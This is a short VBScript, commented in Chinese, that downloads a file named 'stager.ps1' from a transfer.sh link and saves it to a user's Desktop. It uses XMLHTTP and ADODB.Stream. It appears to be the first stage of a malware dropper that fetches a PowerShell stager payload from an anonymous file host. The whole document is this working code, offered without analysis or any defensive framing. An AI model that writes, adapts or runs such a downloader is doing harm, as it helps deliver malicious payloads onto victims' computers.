' 创建 XMLHTTP 对象
Set xmlhttp = CreateObject("Microsoft.XMLHTTP")

' 创建 ADODB.Stream 对象
Set stream = CreateObject("Adodb.Stream")

' 打开文件链接
xmlhttp.Open "GET", "https://transfer.sh/get/QgKpxr/stager.ps1", False

' 发送请求
xmlhttp.Send

' 将下载的数据写入流中
stream.Open
stream.Type = 1 ' 指定流的类型为二进制数据
stream.Write xmlhttp.ResponseBody

' 将流保存到文件中
stream.SaveToFile "C:\Users\Old Green\Desktop\stager.ps1", 2 ' 2 表示 adSaveCreateOverWrite

' 关闭流
stream.Close

' 释放对象
Set stream = Nothing
Set xmlhttp = Nothing

